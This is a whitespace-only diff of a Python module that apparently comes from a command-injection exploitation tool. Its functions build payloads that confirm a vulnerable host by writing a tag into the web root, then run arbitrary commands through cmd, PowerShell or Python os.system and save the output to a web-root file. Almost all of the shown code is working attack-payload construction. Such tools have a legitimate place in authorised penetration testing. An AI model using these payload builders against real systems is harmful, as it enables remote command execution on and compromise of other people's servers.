@@ -9,7 +9,7 @@ This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -23,17 +23,17 @@ from src.utils import settings
 from src.core.injections.controller import checks
 
 """
-File-based decision payload (check if host is vulnerable). 
+File-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     payload = (separator +
               settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'\""
-              ) 
+              )
   else:
     payload = (separator +
               "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
-              ) 
+              )
 
   return payload
 
@@ -45,14 +45,14 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c " + 
+              "for /f \"tokens=*\" %i in ('cmd /c " +
               python_payload +
               "') do @set /p = %i " + settings.CMD_NUL
               )
   else:
     payload = (separator +
               "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
-               ) 
+               )
 
   if settings.USER_AGENT_INJECTION == True or \
      settings.REFERER_INJECTION == True or \
@@ -69,7 +69,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
-  
+
   if settings.TFB_DECIMAL == True:
     payload = (separator + cmd)
 
@@ -77,9 +77,9 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     payload = (separator +
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
               "powershell.exe -InputFormat none write-host (cmd /c \"" +
-              cmd + 
+              cmd +
               "\")\"') do " + settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace("\\","\\\\") + OUTPUT_TEXTFILE + " '%i'" + settings.CMD_NUL
-              ) 
+              )
   else:
     settings.USER_SUPPLIED_CMD = cmd
     payload = (separator +
@@ -99,7 +99,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
     else:
       python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "')\""
       payload = (separator +
-                "for /f \"tokens=*\" %i in ('cmd /c " + 
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do @set /p = %i " + settings.CMD_NUL
                 )
